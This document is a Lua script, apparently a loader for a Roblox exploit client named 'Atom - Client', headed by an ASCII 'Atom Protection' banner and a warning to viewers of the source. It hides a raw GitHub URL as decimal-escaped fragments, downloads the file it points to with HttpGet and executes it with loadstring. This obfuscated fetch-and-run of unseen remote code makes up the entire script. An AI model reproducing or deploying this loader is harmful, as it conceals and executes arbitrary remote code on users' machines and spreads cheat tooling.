--[[ 
░█████╗░████████╗░█████╗░███╗░░░███╗  ░░░░░░
██╔══██╗╚══██╔══╝██╔══██╗████╗░████║  ░░░░░░
███████║░░░██║░░░██║░░██║██╔████╔██║  █████╗
██╔══██║░░░██║░░░██║░░██║██║╚██╔╝██║  ╚════╝
██║░░██║░░░██║░░░╚█████╔╝██║░╚═╝░██║  ░░░░░░
╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝  ░░░░░░

██████╗░██████╗░░█████╗░████████╗███████╗░█████╗░████████╗██╗░█████╗░███╗░░██╗
██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║
██████╔╝██████╔╝██║░░██║░░░██║░░░█████╗░░██║░░╚═╝░░░██║░░░██║██║░░██║██╔██╗██║
██╔═══╝░██╔══██╗██║░░██║░░░██║░░░██╔══╝░░██║░░██╗░░░██║░░░██║██║░░██║██║╚████║
██║░░░░░██║░░██║╚█████╔╝░░░██║░░░███████╗╚█████╔╝░░░██║░░░██║╚█████╔╝██║░╚███║
╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝]]
-- Please leave this page as you have attempted to view the source code of Atom - Client.

local function b(c)
    local d = ""
    for e in c:gsub("\\(%d+)", string.char):gmatch(".") do
        d = d .. e
    end
    return d
end

local part1 = "\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\46\\99\\111\\109\\47"
local part2 = "\\115\\100\\102\\51\\50\\55\\51\\101\\100\\51\\56\\101\\121\\50\\51\\56\\100\\51\\50\\56\\100\\50\\51\\117\\100\\57\\106\\51\\56\\57\\100\\117\\50\\51\\106\\100\\47"
local part3 = "\\50\\102\\52\\53\\55\\104\\107\\100\\51\\50\\51\\97\\116\\111\\109\\47\\109\\97\\105\\110\\47\\83\\111\\102\\116\\46\\108\\117\\97"
local f = b(part1) .. b(part2) .. b(part3)

local function g(h)
    local success, i = pcall(function() return game:HttpGet(h) end)
    if success and i then
        warn("Launching Atom - Client")
        loadstring(i)()
    else
        warn("Can't load Atom - Client")
    end
end

if f then
    g(f)
else
    warn("Can't load Atom - Client.")
end
